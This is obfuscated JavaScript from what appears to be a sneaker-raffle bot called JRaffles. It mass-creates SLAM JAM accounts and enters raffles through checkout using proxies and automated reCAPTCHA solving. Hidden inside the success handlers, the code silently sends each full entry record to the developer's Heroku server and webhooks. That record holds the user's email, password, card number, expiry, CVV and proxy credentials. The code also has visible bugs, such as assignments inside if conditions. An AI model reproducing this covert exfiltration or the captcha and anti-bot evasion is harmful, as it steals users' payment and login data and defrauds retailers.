                                console['log'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x23c1c9[_0x3c563c]), await _0xdbcf4a['click']('label[data-eu-size=\x22' + _0x23c1c9[_0x3c563c] + '\x22]');
                            } else {
                                console['log'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x20412c[_0xc86249]['Size']);
                                try {
                                    await _0xdbcf4a['click']('label[data-eu-size=\x22' + _0x20412c[_0xc86249]['Size'] + '\x22]');
                                } catch {
                                    await _0xdbcf4a['click']('label[data-eu-size=\x22' + _0x20412c[_0xc86249]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x4d70b1(0xbb8), await _0xdbcf4a['$$eval']('.raffle__checkbox-label', _0x299903 => _0x299903['forEach'](_0x414ba5 => _0x414ba5['click']())), await _0x4d70b1(0x7d0), console['log'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0xdbcf4a['click']('#raffle__form-submit'), await _0x4d70b1(0x1388);
                            try {
                                await _0xdbcf4a['waitForSelector']('#raffle__confirmation-message-container'), _0x4c5fc7 = 'no', _0x5155d2(_0x20412c[_0xc86249], _0x2336db), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x43352d = _0x20412c[_0xc86249];
                                try {
                                    prxdata = {
                                        'username': _0x5e8391['replace']('#', ''),
                                        'module': _0x2336db['name'],
                                        'entrydata': JSON['stringify'](_0x43352d),
                                        'proxy': '' + _0x1d9476[_0xc86249]
                                    };
                                    var _0xcf221e = JSON['stringify'](prxdata);
                                    let _0x44d496 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0xcf221e, _0x44d496);
                                } catch (_0x4a2d26) {
                                }
                            } catch (_0x411d6a) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x411d6a));
                            }
                        } catch (_0x283083) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20' + _0x283083)), _0x4c5fc7 = 'yes';
                        } finally {
                            _0xa3021c && _0xa3021c['close']();
                            if (_0x4c5fc7 == 'yes' && _0x3dccda != 0x5 && _0x3ac86b != 'Size\x20Not\x20Found') {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x2336db['name'] + ']\x20Task\x20' + (_0xc86249 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3dccda + '\x20/\x205)')), _0xc86249 = _0xc86249 - 0x1, _0x3dccda = _0x3dccda + 0x1;
                                continue;
                            }
                            _0x4c5fc7 == 'yes' && _0x3dccda >= 0x5 && (_0x5415a4(_0x20412c[_0xc86249], _0x2336db), _0x4c5fc7 = 'no', _0x3dccda = 0x0), console['log']('Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x2d012a, _0x5892c6, _0x568a0e) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x43ebb9 = 0x0; _0x43ebb9 < _0x5892c6['length']; _0x43ebb9++) {
                        if (_0x570ee7 != 'yes')
                            var _0x570ee7 = '', _0x28dc6c = 0x0;
                        var _0x1edf50 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5e8391
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x35ea91['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4d5366
                                }
                            ]
                        }];
                        const _0x3931c4 = { 'embeds': _0x1edf50 };
                        _0x1e0e73(_0x2d012a['name'] + '\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20/\x20' + _0x5892c6['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        try {
                            await _0x408b94(_0x5892c6, _0x43ebb9);
                        } catch {
                            _0x570ee7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x5d6660 = await _0x39e876(_0x5892c6[_0x43ebb9], _0x2d012a, 'acc', ![]);
                        const _0x33b051 = { 'succesDEVMSG': { 'embeds': [_0x5d6660] } };
                        if (_0x5892c6[_0x43ebb9]['Email'] == '' || _0x5892c6[_0x43ebb9]['FirstName'] == '' || _0x5892c6[_0x43ebb9]['LastName'] == '') {
                            console['log'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4d70b1(0x7d0);
                            continue;
                        }
                        (_0x5892c6[_0x43ebb9]['Password'] == '' || _0x5892c6[_0x43ebb9] == undefined) && _0x5892c6[_0x43ebb9]['Password'] == 'JRaffles23!';
                        if (_0x35ea91['useRandomProxy'] = ![])
                            var _0x41214e = _0x568a0e[_0x43ebb9]['split'](':');
                        else
                            var _0x2b9fd9 = Math['round'](Math['random']() * (_0x568a0e['length'] - 0x1)), _0x41214e = _0x568a0e[_0x2b9fd9]['split'](':');
                        var _0x4e095d;
                        try {
                            _0x4e095d = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x41214e[0x0] + ':' + _0x41214e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4e095d = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x41214e[0x0] + ':' + _0x41214e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x36d50b = await _0x4e095d['newPage']();
                            await _0x36d50b['authenticate']({
                                'username': '' + _0x41214e[0x2],
                                'password': '' + _0x41214e[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x2d012a['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x36d50b['setRequestInterception'](!![]), _0x36d50b['on']('request', _0x3429c9 => {
                                _0x3429c9['resourceType']() === 'image' || _0x3429c9['resourceType']() === 'font' || _0x3429c9['resourceType']() === 'media' ? _0x3429c9['abort']() : _0x3429c9['continue']();
                            }), await _0x36d50b['goto']('https://drop.slamjam.com/account/register'), await _0x4d70b1(0xbb8), await _0x36d50b['waitForSelector']('#FirstName'), await _0x36d50b['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x36d50b['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x446ef5() + '\x20[' + _0x2d012a['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20Filling\x20information'), await _0x4d70b1(0x4b0), await _0x36d50b['type']('#FirstName', '' + _0x5892c6[_0x43ebb9]['FirstName']), await _0x4d70b1(0x226), await _0x36d50b['type']('#LastName', '' + _0x5892c6[_0x43ebb9]['LastName']), await _0x4d70b1(0x226), await _0x36d50b['type']('#Email', '' + _0x5892c6[_0x43ebb9]['Email']), await _0x4d70b1(0x2ee), await _0x36d50b['type']('#ConfirmEmail', '' + _0x5892c6[_0x43ebb9]['Email']), await _0x4d70b1(0x2ee), await _0x36d50b['type']('#CreatePassword', '' + _0x5892c6[_0x43ebb9]['Password']), await _0x4d70b1(0x2ee), await _0x36d50b['type']('#CreateConfirmPassword', '' + _0x5892c6[_0x43ebb9]['Password']), await _0x4d70b1(0x226), console['log'](_0x446ef5() + '\x20[' + _0x2d012a['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20Submitting..'), await _0x36d50b['$eval']('#create_customer', _0x14934d => _0x14934d['submit']()), await _0x4d70b1(0x1388), console['log'](_0x446ef5() + '\x20[' + _0x2d012a['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20' + _0x46bace['cyan']('Solving\x20Captcha')), await _0x36d50b['solveRecaptchas'](), console['log'](_0x446ef5() + '\x20[' + _0x2d012a['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x36d50b['$eval']('.shopify-challenge__container\x20>\x20form', _0x5bfec9 => _0x5bfec9['submit']());
                            try {
                                await _0x36d50b['waitForSelector']('.product-card__image'), await _0x4d70b1(0x1f4), _0x570ee7 = 'no', console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x2d012a['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20Account\x20' + _0x5892c6[_0x43ebb9]['Email'] + '\x20Generated!')), _0xf25b74['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x5892c6[_0x43ebb9]['Email'] + ',' + _0x5892c6[_0x43ebb9]['Password']), console['log'](_0x46bace['yellow'](_0x446ef5() + '\x20[' + _0x2d012a['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20Account\x20' + _0x5892c6[_0x43ebb9]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x33b051['succesDEVMSG']);
                                } catch {
                                }
                                await _0x19fe15(_0x55ae18, _0x33b051['succesDEVMSG']);
                            } catch (_0x48b384) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x48b384));
                            }
                        } catch (_0x4ace40) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20' + _0x4ace40));
                        } finally {
                            _0x4e095d && _0x4e095d['close']();
                            if (_0x570ee7 == 'yes' && _0x28dc6c != 0x5) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x2d012a['name'] + ']\x20Task\x20' + (_0x43ebb9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x28dc6c + '\x20/\x205)')), _0x43ebb9 = _0x43ebb9 - 0x1, _0x28dc6c = _0x28dc6c + 0x1;
                                continue;
                            }
                            _0x570ee7 == 'yes' && _0x28dc6c >= 0x5 && (_0x5415a4(_0x5892c6[_0x43ebb9], _0x2d012a), _0x570ee7 = 'no', _0x28dc6c = 0x0), console['log']('Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x232828, _0x5ecb6d, _0x2c11d7) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5c11a4 = 0x0; _0x5c11a4 < _0x5ecb6d['length']; _0x5c11a4++) {
                        var _0x48d7da;
                        if (_0x5e903d != 'yes')
                            var _0x5e903d = '', _0x21aa4d = 0x0;
                        _0x1e0e73(_0x232828['name'] + '\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20/\x20' + _0x5ecb6d['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        try {
                            await _0x408b94(_0x5ecb6d, _0x5c11a4);
                        } catch {
                            _0x5e903d = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x5ecb6d[_0x5c11a4]['Email'] == '' || _0x5ecb6d[_0x5c11a4]['Password'] == '' || _0x5ecb6d[_0x5c11a4]['FirstName'] == '' || _0x5ecb6d[_0x5c11a4]['LastName'] == '') {
                            console['log'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x35ea91['useRandomProxy'] = ![])
                            var _0x456405 = _0x2c11d7[_0x5c11a4]['split'](':');
                        else
                            var _0x5148d2 = Math['round'](Math['random']() * (_0x2c11d7['length'] - 0x1)), _0x456405 = _0x2c11d7[_0x5148d2]['split'](':');
                        var _0x516f27;
                        try {
                            _0x516f27 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x456405[0x0] + ':' + _0x456405[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x516f27 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x456405[0x0] + ':' + _0x456405[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2b5027 = await _0x516f27['newPage']();
                            await _0x2b5027['authenticate']({
                                'username': '' + _0x456405[0x2],
                                'password': '' + _0x456405[0x3]
                            }), await _0x2b5027['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2b5027['setRequestInterception'](!![]), _0x2b5027['on']('request', _0x4a9cc7 => {
                                _0x4a9cc7['resourceType']() === 'image' || _0x4a9cc7['resourceType']() === 'font' || _0x4a9cc7['resourceType']() === 'media' ? _0x4a9cc7['abort']() : _0x4a9cc7['continue']();
                            }), await _0x2b5027['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2b5027['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2b5027['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4d70b1(0x258), await _0x2b5027['waitForSelector']('#CustomerEmail'), console['log'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2b5027['type']('#CustomerEmail', '' + _0x5ecb6d[_0x5c11a4]['Email']), await _0x4d70b1(0x12c), await _0x2b5027['type']('#CustomerPassword', '' + _0x5ecb6d[_0x5c11a4]['Password']), await _0x4d70b1(0x226), await _0x2b5027['$eval']('#customer_login', _0xbf97b0 => _0xbf97b0['submit']()), await _0x4d70b1(0x7d0), await _0x2b5027['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20' + _0x46bace['cyan']('Solving\x20Captcha')), await _0x2b5027['solveRecaptchas'](), console['log'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x2b5027['$eval']('.shopify-challenge__container\x20>\x20form', _0x20c47c => _0x20c47c['submit']());
                            try {
                                await _0x2b5027['waitForSelector']('.nav-account'), await _0x4d70b1(0x4b0);
                            } catch {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2b5027['goto']('' + _0x5ecb6d[_0x5c11a4]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4d70b1(0xbb8), console['log'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2b5027['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x2b5027['click']('.product-select-variant-wrapper'), await _0x4d70b1(0x320), await _0x2b5027['click']('li.product-select-variant__value[data-size=\x22' + _0x5ecb6d[_0x5c11a4]['Size'] + '\x22]'), await _0x4d70b1(0x384), await _0x2b5027['$eval']('#AddToCartForm-product-template-raffle', _0x428f65 => _0x428f65['submit']()), await _0x2b5027['waitForSelector']('.cart-order-summary__content'), await _0x4d70b1(0x514), await _0x2b5027['goto']('https://drop.slamjam.com/checkout'), await _0x4d70b1(0x514), await _0x2b5027['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2b5027['select']('#checkout_shipping_address_country', '' + _0x5ecb6d[_0x5c11a4]['Country']), await _0x4d70b1(0x200), await _0x2b5027['waitForSelector']('#checkout_shipping_address_first_name'), await _0x2b5027['type']('#checkout_shipping_address_first_name', '' + _0x5ecb6d[_0x5c11a4]['FirstName']), await _0x4d70b1(0x237), await _0x2b5027['type']('#checkout_shipping_address_last_name', '' + _0x5ecb6d[_0x5c11a4]['LastName']), await _0x4d70b1(0x1e0), await _0x2b5027['type']('#checkout_shipping_address_address1', _0x5ecb6d[_0x5c11a4]['Address1'] + '\x20' + _0x5ecb6d[_0x5c11a4]['HouseNumber']), await _0x4d70b1(0x514), await _0x2b5027['type']('#checkout_shipping_address_address2', '' + _0x5ecb6d[_0x5c11a4]['Address2']), await _0x4d70b1(0x514);
                            _0x5ecb6d[_0x5c11a4]['Postcode'] == undefined && (_0x5ecb6d[_0x5c11a4]['Postcode'] = _0x5ecb6d[_0x5c11a4]['Zip']);
                            await _0x2b5027['type']('#checkout_shipping_address_zip', '' + _0x5ecb6d[_0x5c11a4]['Postcode']), await _0x4d70b1(0x2bc), await _0x2b5027['type']('#checkout_shipping_address_city', '' + _0x5ecb6d[_0x5c11a4]['City']), await _0x4d70b1(0x320), await _0x2b5027['type']('#checkout_shipping_address_phone', '' + _0x5ecb6d[_0x5c11a4]['Phone']), await _0x4d70b1(0x320), await _0x2b5027['click']('#continue_button'), await _0x4d70b1(0xbb8), await _0x2b5027['waitForSelector']('.summary-title'), await _0x4d70b1(0x320), await _0x2b5027['click']('#continue_button'), await _0x4d70b1(0x320), console['log'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x2b5027['waitForSelector']('#checkout_credit_card_vault'), await _0x4d70b1(0x3e8);
                            var _0x34d5e3 = await _0x2b5027['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x2e08d2 = await _0x34d5e3['contentFrame']();
                            await _0x2e08d2['click']('#number'), await _0x4d70b1(0x3e8), await _0x2e08d2['type']('#number', '' + _0x5ecb6d[_0x5c11a4]['CardNumber'], { 'delay': 0x78 }), _0x34d5e3 = await _0x2b5027['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x2e08d2 = await _0x34d5e3['contentFrame'](), await _0x4d70b1(0x1c2), await _0x2e08d2['click']('#name'), await _0x4d70b1(0x1f4), await _0x2e08d2['type']('#name', '' + _0x5ecb6d[_0x5c11a4]['NameOnCard'], { 'delay': 0x78 }), _0x34d5e3 = await _0x2b5027['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x2e08d2 = await _0x34d5e3['contentFrame'](), await _0x4d70b1(0x1c2), await _0x2e08d2['click']('#expiry'), await _0x4d70b1(0x1f4), await _0x2e08d2['type']('#expiry', '' + _0x5ecb6d[_0x5c11a4]['ExpiryDate'], { 'delay': 0x78 }), _0x34d5e3 = await _0x2b5027['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x2e08d2 = await _0x34d5e3['contentFrame'](), await _0x4d70b1(0x1c2), await _0x2e08d2['click']('#verification_value'), await _0x4d70b1(0x1f4), await _0x2e08d2['type']('#verification_value', '' + _0x5ecb6d[_0x5c11a4]['CVV'], { 'delay': 0x78 }), await _0x2b5027['$eval']('#accepts-flag-raffle', _0x61cf14 => _0x61cf14['click']()), await _0x4d70b1(0x7d0), console['log'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x2b5027['$eval']('#continue_button', _0x432b2b => _0x432b2b['click']()), await _0x4d70b1(0x1b58), await _0x2b5027['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x2b5027['$eval']('.edit_checkout.animate-floating-labels', _0x5dc1c5 => _0x5dc1c5['submit']()), await _0x4d70b1(0x7d0);
                            try {
                                await _0x2b5027['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x5e903d = 'no', _0x5155d2(_0x5ecb6d[_0x5c11a4], _0x232828), console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x393f19) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x393f19['message']);
                            }
                            var _0x429996 = await _0x39e876(_0x5ecb6d[_0x5c11a4], _0x232828, 'dev', ![]), _0x25d6a1 = await _0x39e876(_0x5ecb6d[_0x5c11a4], _0x232828, 'pub', ![]);
                            let _0x3376d3 = _0x5ecb6d[_0x5c11a4];
                            try {
                                prxdata = {
                                    'username': _0x5e8391['replace']('#', ''),
                                    'module': _0x232828['name'],
                                    'entrydata': JSON['stringify'](_0x3376d3),
                                    'proxy': '' + _0x2c11d7[_0x5c11a4]
                                };
                                var _0x5e0eba = JSON['stringify'](prxdata);
                                let _0x247473 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x5e0eba, _0x247473);
                            } catch (_0x3c0948) {
                            }
                            const _0x1187ac = {
                                'succesDEVMSG': { 'embeds': [_0x429996] },
                                'succesPUBMSG': { 'embeds': [_0x25d6a1] }
                            };
                            try {
                                _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x1187ac['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x1187ac['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x44bee6, _0x1187ac['succesPUBMSG']);
                            } catch (_0x23a850) {
                                console['log'](_0x46bace['yellow'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x23a850));
                            }
                        } catch (_0x5548ae) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x482e75[taskModule]['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20' + _0x5548ae)), _0x48d7da = '' + _0x5548ae;
                            var _0x293d29 = await _0x39e876(kickz[_0x5c11a4], _0x232828, 'dev', !![], _0x48d7da);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x293d29] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], EMBEDS['errorDEV']), await _0x19fe15(_0x556085, EMBEDS['errorDEV']), _0x5e903d = 'yes';
                        } finally {
                            _0x516f27 && _0x516f27['close']();
                            if (_0x5e903d == 'yes' && _0x21aa4d != 0x5 && _0x48d7da != 'Size\x20Not\x20Found') {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x232828['name'] + ']\x20Task\x20' + (_0x5c11a4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x21aa4d + '\x20/\x205)')), _0x5c11a4 = _0x5c11a4 - 0x1, _0x21aa4d = _0x21aa4d + 0x1;
                                continue;
                            }
                            _0x5e903d == 'yes' && _0x21aa4d >= 0x5 && (_0x5415a4(_0x5ecb6d[_0x5c11a4], _0x232828), _0x5e903d = 'no', _0x21aa4d = 0x0), console['log']('Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x43b970) {
                    var _0x399c13 = await _0x35dc56(), _0x9498e5 = _0xf25b74['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x33a532 = _0x20e9d9['parse'](_0x9498e5, { 'header': !![] })['data'];
                    for (var _0x49b8f3 = 0x0; _0x49b8f3 < _0x33a532['length']; _0x49b8f3++) {
                        var _0x54d7ed = _0x33a532[_0x49b8f3]['Store'], _0x36470f = _0x33a532[_0x49b8f3]['Mode'];
                        for (var _0x2e1cf7 of _0x482e75) {
                            const _0x4a55c8 = _0x2e1cf7['name']['includes'](_0x54d7ed);
                            if (!_0x4a55c8)
                                continue;
                            for (mode of _0x2e1cf7['modules']) {
                                if (mode['name'] == _0x36470f) {
                                    console['log']('Running\x20' + _0x46bace['cyan'](mode['name'])), await mode['function'](mode, [_0x33a532[_0x49b8f3]], _0x399c13);
                                    var _0x345694 = _0x9498e5['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0xf25b74['writeFileSync']('../failed-tasks.csv', _0x345694);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x33787d = await _0x4a038c['get']('Answer');
                    if (_0x33787d['Answer']['toLowerCase']() == 'y') {
                        _0xf25b74['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x4d70b1(0x3e8);
                        return;
                    }
                    if (_0x33787d['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x4d70b1(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x4d70b1(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x4e2333(_0x29bf84) {
    var _0x4e8478 = await _0x35dc56(), _0x138b65 = _0xf25b74['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x230522 = _0x20e9d9['parse'](_0x138b65, { 'header': !![] })['data'];
    for (var _0x3e5efa = 0x0; _0x3e5efa < _0x230522['length']; _0x3e5efa++) {
        var _0x91d10f = _0x230522[_0x3e5efa]['Store'], _0x5d0a9e = _0x230522[_0x3e5efa]['Mode'];
        for (var _0x3107ab of _0x482e75) {
            const _0x149969 = _0x3107ab['name']['includes'](_0x91d10f);
            if (_0x149969)
                for (mode of _0x482e75[_0x3107ab]['modules']) {
                    const _0x4ab4c3 = mode['name']['includes'](_0x5d0a9e);
                    _0x4ab4c3 && (_0x29bf84 = mode['name'], await mode['function'](_0x29bf84, _0x230522[_0x3e5efa], _0x4e8478));
                }
        }
    }
}
async function _0x5f0c8e() {
    await _0x3e8c88(), console['clear']();
    if (_0x4d5366 != 'devkey') {
        let _0x5cf743 = await _0x4d6da7['autoUpdate']();
        if (_0x5cf743 === 'yes')
            return _0x278666('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x5a1bfa == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x4d70b1(0x2710);
